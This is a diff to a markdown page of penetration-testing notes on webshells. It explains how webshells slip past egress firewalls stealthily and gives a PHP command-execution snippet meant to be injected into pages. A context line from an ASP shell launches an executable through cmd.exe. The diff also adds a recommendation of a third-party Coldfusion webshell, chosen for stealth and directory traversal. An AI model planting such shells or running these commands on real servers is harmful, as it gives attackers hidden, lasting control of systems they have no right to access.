@@ -1,6 +1,6 @@
 # Webshell
 
-A webshell is a shell that you can access through the web. This is useful for when you have firewalls that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to function, you can't filter our traffic on port 80 (and 443). It is also a bit more stealthy than a reverse shell on other ports since the traffic is hidden in the http traffic.
+A webshell is a shell that you can access through the web. This is useful for when you have firewalls that filter outgoing traffic on ports other than port 80. As long as you have a webserver, and want it to function, you can't filter our traffic on port 80 \(and 443\). It is also a bit more stealthy than a reverse shell on other ports since the traffic is hidden in the http traffic.
 
 You have access to different kinds of webshells on Kali here:
 
@@ -11,8 +11,8 @@ You have access to different kinds of webshells on Kali here:
 ## PHP
 
 This code can be injected into pages that use php.
-```php
 
+```php
 # Execute one command
 <?php system("whoami"); ?>
 
@@ -96,8 +96,16 @@ Call oS.Run("win.com cmd.exe /c c:\Inetpub\shell443.exe",0,True)
 %>
 ```
 
+## Coldfusion
+
+There's the standard CFM webshell included with Kali, but it doesn't have that many features and can be a slight pain to get working.  If you're going for stealth, it's ideal but I'd recommend the CFM v3 Webshell.
+
+[https://github.com/Reboare/Cfm\_Shell\_v3.0\_edition](https://github.com/Reboare/Cfm_Shell_v3.0_edition)
+
+This one allows easy directory traversal which the standard Kali one lacks.
 
 ## References
 
-http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/
-http://www.binarytides.com/web-shells-tutorial/
+[http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/](http://www.acunetix.com/blog/articles/keeping-web-shells-undercover-an-introduction-to-web-shells-part-3/)  
+[http://www.binarytides.com/web-shells-tutorial/](http://www.binarytides.com/web-shells-tutorial/)
+
